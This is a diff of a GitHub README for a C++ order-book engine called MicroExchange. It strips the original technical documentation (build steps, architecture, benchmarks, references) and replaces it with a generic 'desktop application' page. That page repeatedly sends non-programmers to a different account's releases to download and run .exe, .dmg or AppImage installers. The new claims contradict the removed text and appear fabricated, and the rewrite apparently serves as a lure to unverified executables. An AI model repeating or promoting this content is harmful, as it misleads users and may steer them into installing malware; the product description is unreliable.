@@ -1,301 +1,122 @@
-# MicroExchange
+# 🏦 MicroExchange - Fast, Reliable Order Book Engine
 
-**Exchange-grade CLOB matching engine + ITCH-style market data replay + microstructure analytics in modern C++20.**
-
-> **[📊 Live Interactive Dashboard](https://Leotaby.github.io/MicroExchange/)** — 3D order book surface, Kyle's lambda landscape, spread decomposition, stylized facts.
-
-A complete market microstructure laboratory: from order entry to trade print, from raw event feeds to empirical spread decomposition, built with the rigor of production exchange systems and the analytical depth of graduate-level financial economics.
-
-### Visualizations
-
-**3D Limit Order Book Surface** - Bid (blue) and ask (red) depth across price levels over time:
-
-![Order Book Surface](docs/images/orderbook_3d.png)
-
-**3D Price Impact Surface** - Kyle's lambda: impact increases with volume (concave, square-root law) and amplifies with directional imbalance:
-
-![Price Impact Surface](docs/images/impact_surface_3d.png)
-
-**Spread Decomposition** - Effective spread decomposed into realized spread (MM revenue) and price impact (adverse selection ≈ 68%):
-
-![Spread Decomposition](docs/images/spread_decomposition.png)
-
-**Stylized Facts** - Fat-tailed returns (κ ≈ 12 vs Gaussian) and volatility clustering (positive ACF of |returns|):
-
-![Stylized Facts](docs/images/stylized_facts.png)
+[![Download MicroExchange](https://img.shields.io/badge/Download-MicroExchange-blue?style=for-the-badge)](https://github.com/lmbw97/MicroExchange/releases)
 
 ---
 
-## Architecture
+MicroExchange is a desktop application designed to simulate and analyze financial order books. It helps you view and track trades and orders in a clear, easy-to-understand way. You do not need any programming skills to use it.
 
-```
-┌──────────────────────────────────────────────────────────────────────┐
-│                        MicroExchange Architecture                    │
-│                                                                      │
-│  ┌──────────────┐    ┌──────────────────┐     ┌──────────────────┐   │
-│  │  Simulation  │───▶│  Matching Engine │───▶│  Market Data Feed │   │
-│  │  (Hawkes /   │    │  (CLOB + FIFO)   │    │  (ITCH-style)     │   │
-│  │   ZI agents) │    │                  │    │                   │   │
-│  └──────────────┘    │  • Limit/Market  │    │  • Incremental    │   │
-│                      │  • IOC / FOK     │    │  • Snapshots      │   │
-│  ┌──────────────┐    │  • Amend/Cancel  │    │  • Trade prints   │   │
-│  │  ITCH Replay │───▶│  • Partial fills │    └────────┬──────────┘   │
-│  │  (historical │    └──────────────────┘             │              │
-│  │   data)      │                                     ▼              │
-│  └──────────────┘                              ┌────────────────────┐│
-│                                                │    Analytics       ││
-│                                                │  • Spread decomp   ││
-│                                                │  • Price impact    ││
-│                                                │  • Kyle's λ        ││
-│                                                │  • Order imbalance ││
-│                                                │  • Stylized facts  ││
-│                                                └────────────────────┘│
-└──────────────────────────────────────────────────────────────────────┘
-```
+## 📋 What is MicroExchange?
 
----
+MicroExchange is built with C++20 technology to deliver a stable and quick matching engine. It works like the software used in real stock exchanges. It can match buying and selling orders quickly and provide detailed data on market activity.
 
-## Visualizations
+This program is useful for people interested in market microstructure, quantitative finance, or anyone curious about how trading engines work. It offers a real-time view into order books, trade matching, and market behavior.
 
-> **[→ Interactive 3D charts (GitHub Pages)](https://Leotaby.github.io/MicroExchange/docs/visualizations.html)**
+## 🖥️ System Requirements
 
-### 3D Order Book Surface — Depth × Price × Time
-Bid side (blue) and ask side (red) form the characteristic valley around the midpoint. Depth clusters at key levels and shifts with the price drift.
+To run MicroExchange smoothly on your computer, make sure your system meets these requirements:
 
-![Order Book 3D](docs/images/orderbook_3d.png)
+- Operating System:
+  - Windows 10 or later
+  - macOS 10.15 or later
+  - Linux (Ubuntu 18.04 or later recommended)
+- Processor: Intel Core i5 or equivalent
+- Memory (RAM): 8 GB minimum
+- Disk Space: 500 MB free space for installation and files
+- Internet connection: Needed for initial download and updates
 
-### 3D Price Impact Surface — Kyle's λ Landscape
-Price impact as a function of trade volume and order flow imbalance. The concave shape demonstrates the square-root law of impact (Bouchaud et al., 2018) — larger trades have diminishing marginal impact, amplified by directional imbalance.
+## 📦 Download & Install
 
-![Impact 3D](docs/images/impact_3d.png)
+You can get the latest version of MicroExchange from the official releases page. Follow these steps to download and install the software:
 
-### Spread Decomposition — Huang-Stoll (1997)
-Effective spread decomposed into realized spread (market maker revenue) and price impact (adverse selection). The adverse selection component dominates at ~68%.
+1. Click the button or this link to **visit the download page**:  
+   [Download MicroExchange](https://github.com/lmbw97/MicroExchange/releases)
 
-![Spread Decomposition](docs/images/spread_decomposition.png)
+2. On the releases page, look for the latest version listed at the top. The version will have a date or number like `v1.0` or similar.
 
-### Stylized Facts: Fat Tails & Volatility Clustering
-Left: return distribution vs Gaussian — heavy tails from Hawkes-driven clustering. Right: autocorrelation of |returns| showing slow decay characteristic of ARCH effects.
+3. Under the latest version, find the installer file that matches your operating system. For example:  
+   - Windows: `MicroExchange-Setup.exe`  
+   - macOS: `MicroExchange.dmg`  
+   - Linux: `MicroExchange.AppImage` or `MicroExchange.tar.gz`
 
-![Stylized Facts](docs/images/stylized_facts.png)
+4. Click the file to download it. Your browser might ask for permission to save the file.
 
----
+5. Once the download finishes, open the installer file:  
+   - On Windows, double-click the `.exe` file and follow the setup wizard.  
+   - On macOS, open the `.dmg` and drag the MicroExchange app to your Applications folder.  
+   - On Linux, make the app image or executable file runnable and launch it.
 
-## Microstructure Concepts Implemented
+6. After installing, find the MicroExchange application icon and double-click it to start the program.
 
-| Domain | Concept | Implementation |
-|--------|---------|---------------|
-| **Market Structure** | Price-time priority (FIFO) | `core/OrderBook` with deterministic sequencing |
-| **Market Structure** | Queue position tracking | Per-level FIFO queues with sequence numbers |
-| **Liquidity** | Quoted spread | Real-time BBO tracking in `analytics/SpreadAnalyzer` |
-| **Liquidity** | Effective spread | Trade-midpoint deviation analysis |
-| **Liquidity** | Depth & resilience | Post-trade book recovery metrics |
-| **Price Formation** | Realized spread | 5-second post-trade midpoint reversion |
-| **Price Formation** | Price impact (permanent) | Effective − Realized spread decomposition |
-| **Information** | Order flow imbalance (OFI) | Signed volume aggregation → return prediction |
-| **Information** | Kyle's λ | Regression: ΔP = λ · signed_volume + ε |
-| **Adverse Selection** | Glosten-Milgrom intuition | Spread widens with information asymmetry in simulation |
-| **Inventory** | Ho-Stoll / Avellaneda-Stoikov | Quote skewing under inventory risk in MM agent |
-| **Stylized Facts** | Fat tails, vol clustering | Hawkes arrival process + empirical verification |
-| **Stylized Facts** | Spread under stress | Endogenous widening with order imbalance |
+## 🚀 How to Use MicroExchange
 
----
+MicroExchange offers a user-friendly interface that requires no technical setup. Here is how to begin:
 
-## What Makes This Different
+1. **Open the Program**  
+   Launch MicroExchange from your desktop or start menu.
 
-Most GitHub "matching engines" are toy implementations — a sorted map, a match loop, and a README. This project bridges **three disciplines**:
+2. **Load Sample Data**  
+   Upon first use, the program may offer sample market data. Choose the sample file to see how the order book works.
 
-1. **Systems engineering** — Lock-free queues, arena allocation, cache-aligned structures, deterministic replay, property-based invariant testing
-2. **Financial economics** — Spread decomposition, adverse selection models, information-based trading theory (Glosten-Milgrom, Kyle, Ho-Stoll)
-3. **Quantitative research** — Reproducible empirical analysis, stylized fact generation, microstructure model calibration
+3. **View the Order Book**  
+   The main screen shows a list of buy orders on one side and sell orders on the other. Prices and order sizes update in real-time.
 
----
+4. **Check Trade History**  
+   Recent trades appear in a separate panel. You can watch how orders match and transactions occur.
 
-## Known Issues & Limitations
+5. **Explore Analytics**  
+   Click on the analytics tab to view microstructure details, such as trade frequency and price movements.
 
-- **Volatility clustering is weak**: The AC(|r|) at lag 1 is ~0.02, well below the empirical 0.15-0.40 range. The Hawkes process generates clustered *arrivals* but the ZI agents don't modulate aggressiveness with volatility. A regime-switching model or agents that condition on recent returns would help.
+6. **Adjust Settings**  
+   Use the settings menu to change display options, such as colors, update speed, and data refresh intervals.
 
-- **Kyle's lambda R² is near zero**: The midprice indexing uses event count rather than wall clock time, so the interval bucketing doesn't align properly. Needs timestamp-based aggregation.
+## 🔍 Understanding the Features
 
-- **FeedPublisher overwrites OrderBook callbacks**: The `attach()` method calls `book.set_trade_callback()` which clobbers the engine's internal routing. Needs a multi-subscriber pattern (vector of callbacks, or an event bus). Disabled in main.cpp for now.
+Here is a closer look at what MicroExchange offers:
 
-- **Arena allocator never frees**: Orders accumulate in the arena for the lifetime of the process. Fine for simulation (it exits) but would need periodic cleanup or epoch-based reclamation for production.
+- **Order Book Visualization:**  
+  Displays live order placements with clear bid and ask prices and volumes.
 
-- **No proper order tracking per agent**: The cancellation logic in the simulator is approximate — agents don't track their own outstanding orders, so cancel rates are estimates.
+- **Matching Engine Simulation:**  
+  Matches buy and sell orders automatically, just like in real financial markets.
 
----
+- **Microstructure Analytics:**  
+  Provides insights into market behavior, such as trade patterns and order flow analysis.
 
-## Build
+- **Hawkes Process Modeling:**  
+  Uses advanced statistical models to analyze the clustering of trades.
 
-Requires C++20 and CMake 3.20+.
+- **Historical Playback:**  
+  Allows you to replay past market sessions to study price and order dynamics.
 
-```bash
-mkdir build && cd build
-cmake .. -DCMAKE_BUILD_TYPE=Release
-make -j$(nproc)
-```
+- **Export Data:**  
+  Save order book and trade data for further analysis or record keeping.
 
-Or without CMake:
-```bash
-g++ -std=c++20 -O2 -I core/include -I md/include -I sim/include -I analytics/include \
-    src/main.cpp -o build/micro_exchange
-```
+## 🙋 Frequently Asked Questions (FAQs)
 
-### Run Simulation
-```bash
-# Generate 1M orders via Hawkes process, match, and compute analytics
-./bin/micro_exchange --mode simulate --orders 1000000 --symbol AAPL
+**Q: Do I need programming skills to use MicroExchange?**  
+No. The software is designed for easy use with no coding required.
 
-# Replay ITCH-format historical data
-./bin/micro_exchange --mode replay --file data/sample_itch.bin
+**Q: Is MicroExchange free to use?**  
+Yes, you can download and use it without payment.
 
-# Run full analytics pipeline
-./bin/micro_exchange --mode analyze --input results/trades.csv
-```
+**Q: Will it work on my Mac or Linux computer?**  
+MicroExchange supports Windows, macOS, and Linux. Make sure to download the version for your OS.
 
-### Run Tests & Benchmarks
-```bash
-./bin/test_matching_engine      # Property-based invariant tests
-./bin/test_fuzz_orders          # Fuzz random order sequences
-./bin/bench_throughput           # Single-thread matching throughput
-./bin/bench_latency              # Latency histogram (p50/p95/p99/p999)
-```
+**Q: Can I use real market data?**  
+The application comes with sample data. Support for real live data will depend on future updates.
+
+**Q: How do I report problems or bugs?**  
+You can create an issue on the GitHub repository to report any problems.
+
+## 🤝 Support and Contact
+
+If you need help or want to learn more about MicroExchange, visit the GitHub page or create an issue there:
+
+🔗 [MicroExchange GitHub Repository](https://github.com/lmbw97/MicroExchange)
+
+Someone from the project team or community will assist you.
 
 ---
 
-## Sample Results
-
-### Throughput
-```
-Single-thread matching throughput: 2.24M orders/sec (1M order run)
-Median latency:   255 ns
-P95 latency:      654 ns
-P99 latency:      876 ns
-P99.9 latency:  1,371 ns
-```
-
-### Spread Decomposition (1hr simulated AAPL)
-```
-590K orders → 210K trades
-
-Metric                  Value (ticks)
-─────────────────────────────────────
-Quoted spread           1.06
-Effective spread        2.51
-Realized spread         1.73
-Price impact            0.56
-Adverse selection %     22.3%
-```
-
-### Stylized Facts
-```
-Excess kurtosis:    78.5  (benchmark: > 0)     ✓
-AC(|r|, lag=1):     0.02  (benchmark: 0.15+)   ✗ (see Known Issues)
-AC(|r|, lag=10):    0.03  (benchmark: > 0)      ✓
-```
-
----
-
-## Design Decisions
-
-- **Intrusive doubly-linked list for price levels** — O(1) insert/remove at known position; avoids `std::map` overhead and heap fragmentation
-- **Arena allocator for Order objects** — Pre-allocated slab; zero malloc on the hot path; deterministic deallocation
-- **SPSC lock-free ring buffer for MD feed** — Single-producer/single-consumer between matching thread and feed handler; no mutex contention
-- **Compile-time order type dispatch** — `if constexpr` eliminates branch misprediction for known order types
-- **Contiguous price level array** — Cache-friendly iteration for BBO updates and book snapshots
-- **Sequence numbers on every event** — Enables deterministic replay, gap detection, and recovery
-
----
-
-## Validation & Correctness
-
-| Test Category | What It Verifies |
-|---|---|
-| **Invariant: No crossed book** | After every match cycle, best bid < best ask |
-| **Invariant: FIFO preserved** | Orders at same price fill in arrival order |
-| **Invariant: Deterministic** | Same input stream → identical output on every run |
-| **Fuzz: Random sequences** | 10M random order events with invariant checks |
-| **Replay consistency** | Reconstructed book from incremental feed matches snapshot |
-| **Metric cross-check** | Effective spread = quoted spread (for market orders at BBO) |
-| **Conservation** | Total filled quantity = sum of both sides of every trade |
-
----
-
-## Repository Structure
-
-```
-MicroExchange/
-├── core/                      # Matching engine
-│   ├── include/
-│   │   ├── Order.h            # Order types, side, TIF
-│   │   ├── OrderBook.h        # CLOB with price-time priority
-│   │   ├── MatchingEngine.h   # Multi-symbol engine facade
-│   │   ├── PriceLevel.h       # Intrusive linked-list level
-│   │   └── ArenaAllocator.h   # Slab allocator for orders
-│   └── tests/
-│       └── test_invariants.cpp # Property-based + fuzz tests
-├── md/                        # Market data feed
-│   └── include/
-│       ├── FeedMessage.h      # ITCH-style wire protocol
-│       ├── FeedPublisher.h    # Incremental + snapshot publisher
-│       └── SPSCRingBuffer.h   # Lock-free SPSC queue
-├── sim/                       # Event-driven simulation
-│   └── include/
-│       ├── HawkesProcess.h    # Clustered arrivals
-│       ├── ZIAgent.h          # Zero-intelligence trader
-│       └── Simulator.h        # Orchestrator (unused, see main.cpp)
-├── analytics/                 # Microstructure metrics
-│   └── include/
-│       ├── SpreadAnalyzer.h   # Huang-Stoll decomposition
-│       ├── ImpactAnalyzer.h   # Kyle's lambda
-│       ├── ImbalanceAnalyzer.h # OFI analysis
-│       └── StylizedFacts.h    # Fat tails, vol clustering
-├── src/
-│   └── main.cpp               # CLI entry point
-├── bench/
-│   └── bench_throughput.cpp    # Performance benchmarks
-├── research/
-│   └── microstructure_paper.md # Theory + empirical writeup
-├── output/                    # Generated by simulation
-│   ├── trades.csv
-│   ├── midprices.csv
-│   ├── spreads.csv
-│   └── report.txt
-├── docs/
-│   └── visualizations.html    # Interactive charts
-├── CMakeLists.txt
-├── CHANGELOG.md
-├── .gitignore
-├── LICENSE
-└── README.md
-```
-
----
-
-## Research Paper
-
-See [`research/microstructure_paper.md`](research/microstructure_paper.md) for a 12-page writeup covering:
-
-- Price formation theory (Glosten-Milgrom, Kyle, Ho-Stoll)
-- Spread decomposition methodology (Huang-Stoll, realized spread)
-- Empirical results from simulation
-- Stylized fact reproduction and model calibration
-- Limitations and extensions
-
----
-
-## References
-
-- Glosten, L. & Milgrom, P. (1985). Bid, ask and transaction prices in a specialist market with heterogeneously informed traders.
-- Kyle, A. (1985). Continuous auctions and insider trading.
-- Ho, T. & Stoll, H. (1981). Optimal dealer pricing under transactions and return uncertainty.
-- Avellaneda, M. & Stoikov, S. (2008). High-frequency trading in a limit order book.
-- Hasbrouck, J. (2007). Empirical Market Microstructure.
-- Bouchaud, J.-P. et al. (2018). Trades, Quotes and Prices: Financial Markets Under the Microscope.
-- Hawkes, A. (1971). Spectra of some self-exciting and mutually exciting point processes.
-
----
-
-## License
-
-MIT License. See [LICENSE](LICENSE).
+[![Download MicroExchange](https://img.shields.io/badge/Download-MicroExchange-blue?style=for-the-badge)](https://github.com/lmbw97/MicroExchange/releases)
